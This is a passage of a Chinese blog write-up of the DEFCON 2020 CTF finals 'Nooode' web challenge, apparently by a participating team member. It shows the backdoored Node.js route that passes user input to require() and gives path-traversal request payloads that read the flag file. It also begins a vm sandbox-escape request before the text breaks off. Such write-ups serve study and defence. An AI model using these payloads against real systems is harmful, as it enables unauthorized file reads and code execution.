&#x62A2;&#x7B2C;&#x4E00;&#x3002;</p><p>&#x7ED3;&#x675F;&#x4E4B;&#x540E;&#xFF0C;&#x867D;&#x7136;&#x7A97;&#x5916;&#x7684;&#x9633;&#x5149;&#x683C;&#x5916;&#x7684;&#x523A;&#x773C;&#xFF0C;&#x5317;&#x4EAC;&#x65E9;&#x9AD8;&#x5CF0;&#x4F34;&#x968F;&#x7740;&#x6C7D;&#x8F66;&#x7684;&#x9E23;&#x7B1B;&#x5DF2;&#x7ECF;&#x7EB7;&#x81F3;&#x6C93;&#x6765;&#xFF0C;&#x4F46;&#x662F;&#x5BA4;&#x5185;&#x6211;&#x4EEC;&#x6BD4;&#x8F83;&#x5E73;&#x9759;&#xFF0C;&#x5927;&#x5BB6;&#x90FD;&#x6536;&#x62FE;&#x6536;&#x62FE;&#x4E1C;&#x897F;&#xFF0C;&#x6361;&#x4E86;&#x6361;&#x5783;&#x573E;&#x65B9;&#x4FBF;&#x963F;&#x59E8;&#x6253;&#x626B;&#xFF0C;&#x968F;&#x4FBF;&#x804A;&#x4E86;&#x804A;&#x770B;&#x4E86;&#x770B;&#x5176;&#x4ED6;&#x961F;&#x5BF9;&#x4E8E;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x5410;&#x69FD;&#xFF0C;&#x7136;&#x540E;&#x5C31;&#x90FD;&#x5404;&#x81EA;&#x56DE;&#x53BB;&#x4F11;&#x606F;&#x4E86;&#x3002;&#x6211;&#x56DE;&#x53BB;&#x540E;&#x5F00;&#x7740; DEFCON &#x76F4;&#x64AD;&#x7B49;&#x4E86;&#x597D;&#x4E00;&#x4F1A;&#xFF0C;&#x53D1;&#x73B0;&#x4ED6;&#x4EEC;&#x8FD8;&#x633A;&#x78E8;&#x8E6D;&#x7684;&#xFF0C;&#x987A;&#x4FBF;&#x6D17;&#x4E86;&#x4E2A;&#x6FA1;&#xFF0C;&#x56DE;&#x6765;&#x7B49;&#x5F85;&#x7740;&#x63ED;&#x6653;&#x6700;&#x7EC8;&#x7ED3;&#x679C;&#x3002;</p><p>&#x540E;&#x9762;&#x516C;&#x5E03;&#x699C;&#x5355;&#xFF0C;&#x5F97;&#x77E5;&#x6211;&#x4EEC;&#x662F;&#x62FF;&#x5230;&#x4E86;&#x7B2C;&#x56DB;&#x540D;&#xFF0C;&#x81EA;&#x5DF1;&#x5012;&#x4E5F;&#x6CA1;&#x6709;&#x4EC0;&#x4E48;&#x7279;&#x522B;&#x7684;&#x5FC3;&#x60C5;&#xFF0C;&#x77E5;&#x9053;&#x4E4B;&#x540E;&#x4E5F;&#x5C31;&#x6574;&#x7406;&#x6574;&#x7406;&#x8FD9;&#x4E24;&#x5929;&#x7684;&#x9898;&#x76EE;&#xFF0C;&#x770B;&#x4E86;&#x770B;&#x5927;&#x5BB6;&#x5BF9;&#x4E8E;&#x8FD9;&#x6B21;&#x6BD4;&#x8D5B;&#x7684;&#x8BC4;&#x8BBA;&#xFF0C;&#x4E4B;&#x540E;&#x5C31;&#x7761;&#x4E86;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013012759.jpeg" alt></p><p>&#x5012;&#x662F;&#x5728;&#x63ED;&#x6653;&#x4E00;&#x4E8C;&#x540D;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4E3B;&#x529E;&#x65B9;&#x5E94;&#x8BE5;&#x662F;&#x7279;&#x5730;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x5206;&#x6570;&#x52A8;&#x6001;&#x56FE;&#x6765;&#x663E;&#x793A;&#x6700;&#x540E;&#x6BD4;&#x8D5B;&#x7684;&#x6FC0;&#x70C8;&#xFF0C;&#x70D8;&#x6258;&#x4E00;&#x4E0B;&#x7D27;&#x5F20;&#x7684;&#x6C1B;&#x56F4;&#xFF0C;&#x6700;&#x540E;&#x663E;&#x793A; A0E &#x4EE5; 2 &#x5206;&#x7684;&#x4F18;&#x52BF;&#x9669;&#x80DC; PPP &#x62FF;&#x5230;&#x4E86;&#x51A0;&#x519B;&#xFF0C;&#x4E5F;&#x610F;&#x5473;&#x7740;&#x5237;&#x65B0;&#x4E86;&#x4E2D;&#x56FD;&#x5927;&#x9646;&#x6218;&#x961F;&#x5728; DEFCON CTF &#x4E0A;&#x53D6;&#x5F97;&#x7684;&#x6700;&#x597D;&#x7684;&#x6210;&#x7EE9;&#xFF0C;&#x4E5F;&#x7B97;&#x8C01;&#x89C1;&#x8BC1;&#x4E86;&#x4E00;&#x6B21;&#x5386;&#x53F2;&#x5427; XD</p><h2 id="Nooode"><a href="#Nooode" class="headerlink" title="Nooode"></a>Nooode</h2><p>&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;<a href="https://github.com/o-o-overflow/dc2020f-nooode-public" target="_blank" rel="noopener">https://github.com/o-o-overflow/dc2020f-nooode-public</a> &#xFF0C;&#x611F;&#x5174;&#x8DA3;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x53BB;&#x5206;&#x6790;&#x590D;&#x73B0;&#x4E00;&#x4E0B;&#x3002;</p><p>Web &#x9898;&#x95EE;&#x9898;&#x4E3B;&#x8981;&#x662F;&#x5728; public-nooode/routes/config.js &#x6587;&#x4EF6;&#x4E2D;&#x5B58;&#x5728;&#x4E00;&#x5904; BackDooor </p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="hljs-string">&apos;/validated/:lib?/:f?&apos;</span>, <span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">req, res, next</span>) </span>{</span><br><span class="line">  <span class="hljs-keyword">let</span> config = res.locals.config;</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.lib) req.params.lib = <span class="hljs-string">&quot;json-schema&quot;</span></span><br><span class="line">  <span class="hljs-keyword">if</span> (!req.params.f) req.params.f = <span class="hljs-string">&quot;validate&quot;</span></span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> jsonlib = <span class="hljs-built_in">require</span>(req.params.lib)</span><br><span class="line">  <span class="hljs-keyword">let</span> valid = jsonlib[req.params.f](req.body)</span><br><span class="line">  <span class="hljs-keyword">if</span> (!valid) {</span><br><span class="line">    res.send(<span class="hljs-string">&quot;validator failed&quot;</span>);</span><br><span class="line">    <span class="hljs-keyword">return</span></span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">let</span> p;</span><br><span class="line">  <span class="hljs-keyword">if</span> (config.path) { </span><br><span class="line">    p = config.path;</span><br><span class="line">  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (config.filepath) {</span><br><span class="line">    p = config.filepath;</span><br><span class="line">  }</span><br><span class="line"></span><br><span class="line">  <span class="hljs-keyword">let</span> data = fs.readFileSync(p).toString()</span><br><span class="line">  <span class="hljs-keyword">try</span> {</span><br><span class="line">    data = <span class="hljs-built_in">JSON</span>.parse(data)</span><br><span class="line">    <span class="hljs-keyword">if</span> (_.isEqual(req.body, data))</span><br><span class="line">      res.json(data)</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    res.send({ <span class="hljs-string">&quot;validator&quot;</span>: valid, <span class="hljs-string">&quot;data&quot;</span>:data, <span class="hljs-string">&quot;msg&quot;</span>: <span class="hljs-string">&quot;data is corrupted&quot;</span>})</span><br><span class="line">  } <span class="hljs-keyword">catch</span> {</span><br><span class="line">    res.send({ <span class="hljs-string">&quot;validator&quot;</span>: valid, <span class="hljs-string">&quot;data&quot;</span>:data})</span><br><span class="line">  }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x6BD4;&#x8F83;&#x719F;&#x6089;&#x7684;&#x540C;&#x5B66;&#x53EF;&#x4EE5;&#x4E00;&#x773C;&#x5C31;&#x770B;&#x770B;&#x5230;&#x95EE;&#x9898;&#x6240;&#x5728;&#x4E86;&#x3002;</p><p>&#x7531;&#x4E8E;&#x5B98;&#x65B9;&#x63D0;&#x4F9B;&#x7684;&#x662F;&#x6574;&#x573A;&#x6BD4;&#x8D5B;&#x6240;&#x6709;&#x7684;&#x6D41;&#x91CF;&#x5305;&#x8FC7;&#x5927;&#xFF0C;&#x5E76;&#x6CA1;&#x6709;&#x5177;&#x4F53;&#x5206;&#x7C7B;&#xFF0C;&#x6574;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x591A;&#x8FBE; 200 GB &#xFF0C;&#x800C;&#x4E14;&#x5BF9;&#x4E8E; Web &#x9898;&#x76EE;&#x6765;&#x8BF4;&#xFF0C;&#x57FA;&#x672C;&#x51E0;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x5C31;&#x80FD;&#x62FF;&#x5230;&#x5927;&#x591A;&#x6570;&#x7684; Payload &#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x62FF;&#x4E86;&#x6211;&#x624B;&#x5934;&#x4E0A;&#x5F53;&#x65F6;&#x4E0B;&#x8F7D;&#x7684;&#x57FA;&#x672C;&#x5206;&#x90E8;&#x4E86;&#x5927;&#x591A;&#x6570;&#x65F6;&#x95F4;&#x6BB5;&#x7684;&#x6D41;&#x91CF;&#x5305;&#xFF0C;&#x63D0;&#x53D6;&#x4E86;&#x4E00;&#x4E0B; HTTP &#x6D41;&#x91CF;&#x5E76;&#x8FDB;&#x884C;&#x4E86;&#x7B80;&#x5355;&#x7EDF;&#x8BA1;&#x5904;&#x7406;&#xFF0C;&#x5E76;&#x6309;&#x7167;&#x51FA;&#x73B0;&#x7684;&#x6B21;&#x6570;&#x8FDB;&#x884C;&#x4E86;&#x4ECE;&#x9AD8;&#x5230;&#x4F4E;&#x7684;&#x6392;&#x5E8F;&#xFF0C;&#x5F97;&#x5230;&#x4E86;&#x4EE5;&#x4E0B;&#x7684;&#x7ED3;&#x679C;&#xFF1A;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013015810.png" alt></p><p>&#x5947;&#x602A;&#xFF0C;&#x4E2D;&#x95F4;&#x597D;&#x50CF;&#x6DF7;&#x5165;&#x4E86;&#x4EC0;&#x4E48;&#x5947;&#x602A;&#x7684;&#x4E1C;&#x897F;&#xFF08;</p><p>&#x5F53;&#x7136;&#x5176;&#x4ED6;&#x6D41;&#x91CF;&#x5305;&#x6216;&#x8BB8;&#x8FD8;&#x53EF;&#x80FD;&#x5B58;&#x5728;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x7684; Payload &#xFF0C;&#x4F46;&#x662F;&#x57FA;&#x672C;&#x8BE5;&#x9898;&#x6240;&#x6709;&#x7684;&#x70B9;&#x90FD;&#x5728;&#x8FD9;&#x4E86;&#x3002;&#x5E76;&#x4E14;&#x6BCF;&#x4E2A;&#x6D41;&#x91CF;&#x5305;&#x90FD;&#x5145;&#x65A5;&#x7740;&#x5927;&#x91CF;&#x7684;&#x5783;&#x573E;&#x6D41;&#x91CF;&#xFF0C;&#x63A5;&#x4E0B;&#x6765;&#x5C31;&#x662F;&#x5783;&#x573E;&#x6D41;&#x91CF;&#x5927;&#x8D4F;&#xFF0C;&#x539F;&#x6765;&#x4F60;&#x5C31;&#x662F;&#x4E2D;&#x56FD;&#x6587;&#x5316;&#x5BA3;&#x4F20;&#x5927;&#x4F7F;&#xFF1F;&#x4E0D;&#x7528;&#x6211;&#x591A;&#x8BF4;&#x5C31;&#x77E5;&#x9053;&#x4E86;&#x5427;&#xFF0C;&#x8DDF;&#x67D0;&#x4E2A;&#x5E08;&#x5085;&#x6253;&#x8FC7; AWD &#x7684;&#x90FD;&#x5E94;&#x8BE5;&#x77E5;&#x9053;&#x662F;&#x8C01;&#x53D1;&#x7684;&#x8FD9;&#x4E9B;&#x5783;&#x573E;&#x6D41;&#x91CF;&#x3002;</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20201013020131.png" alt></p><h3 id="Require"><a href="#Require" class="headerlink" title="Require"></a>Require</h3><p>&#x4E00;&#x5F00;&#x59CB;&#x5927;&#x591A;&#x961F;&#x4F0D;&#x90FD;&#x6253;&#x7684;&#x662F;<code>require</code>&#x76F4;&#x63A5;&#x5305;&#x542B;&#x7684;&#x70B9;&#xFF0C;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x5F00;&#x4E86; debug &#x62A5;&#x9519;&#xFF0C;&#x5728;&#x4F7F;&#x7528;<code>require</code>&#x5305;&#x542B; flag &#x7684;&#x65F6;&#x5019;&#x4F1A;&#x76F4;&#x63A5;&#x62A5;&#x9519;&#x56DE;&#x663E; flag &#xFF0C;&#x5982;&#x4E0B; 000AAA &#x5373;&#x4E3A; flag</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Invalid or unexpected token<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">h2</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">pre</span>&gt;</span>/flag:1</span><br><span class="line">000AAAA</span><br><span class="line">^^^</span><br><span class="line"></span><br><span class="line">SyntaxError: Invalid or unexpected token</span><br><span class="line">    at wrapSafe (internal/modules/cjs/loader.js:1070:16)</span><br><span class="line">    at Module._compile (internal/modules/cjs/loader.js:1120:27)</span><br><span class="line">    at Object.Module._extensions..js (internal/modules/cjs/loader.js:1176:10)</span><br><span class="line">    at Module.load (internal/modules/cjs/loader.js:1000:32)</span><br><span class="line">    at Function.Module._load (internal/modules/cjs/loader.js:899:14)</span><br><span class="line">    at Module.require (internal/modules/cjs/loader.js:1042:19)</span><br><span class="line">    at Module.Hook._require.Module.require (/usr/local/lib/node_modules/pm2/node_modules/require-in-the-middle/index.js:80:39)</span><br><span class="line">    at require (internal/modules/cjs/helpers.js:77:18)</span><br><span class="line">    at /service/routes/config.js:21:17</span><br><span class="line">    at Layer.handle [as handle_request] (/service/node_modules/express/lib/router/layer.js:95:5)<span class="hljs-tag">&lt;/<span class="hljs-name">pre</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x601D;&#x8DEF;&#x7684; payload &#x5C31;&#x6709;&#x5F88;&#x591A;&#x53D8;&#x79CD;&#x4E86;&#xFF0C;&#x4F8B;&#x5982;&#xFF1A;</p><ul><li><code>POST /config/validated/..%2F..%2F..%2F..%2F..%2F..%2F..%2Fflag HTTP/1.1</code> &#x52A0;&#x4E0A;&#x4E00;&#x4E9B; body &#x5185;&#x5BB9;&#x3001;&#x6216;&#x8005;&#x8FDB;&#x884C;&#x5168; urlencode &#x3001;&#x53C8;&#x6216;&#x8005;&#x518D;&#x8DEF;&#x5F84;&#x540E;&#x9762;&#x52A0;&#x4E00;&#x4E2A;&#x8DEF;&#x5F84;<code>POST /config/validated/%2Fflag/a HTTP/1.1</code></li><li><code>POST /config/validated/%2ffl%61g HTTP/1.1</code></li><li><code>POST /config/validated/%2fproc%2fself%2froot%2ffl%61g HTTP/1.1</code></li></ul><h3 id="vm"><a href="#vm" class="headerlink" title="vm"></a>vm</h3><p>&#x8FD8;&#x6709;&#x5C31;&#x662F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5185;&#x7F6E;&#x7684; vm lib &#xFF0C;&#x7531;&#x4E8E; vm lib &#x9003;&#x9038;&#x5DF2;&#x7ECF;&#x88AB;&#x5F04;&#x70C2;&#x4E86;&#xFF0C;&#x57FA;&#x672C;&#x80FD;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x5229;&#x7528;&#x7684; exp &#x76F4;&#x63A5;&#x62FF; flag</p><p></p><figure class="highlight hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">POST</span> <span class="hljs-string">/config/validated/vm/runInNewContext</span> HTTP/1.1</span><br><span class="line"><span class="hljs-attribute">Host</span>: zedd.vv:4017</span><br><span class="line"><span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:81.0) Gecko/20100101 Firefox/81.0</span><br><span class="line"><span 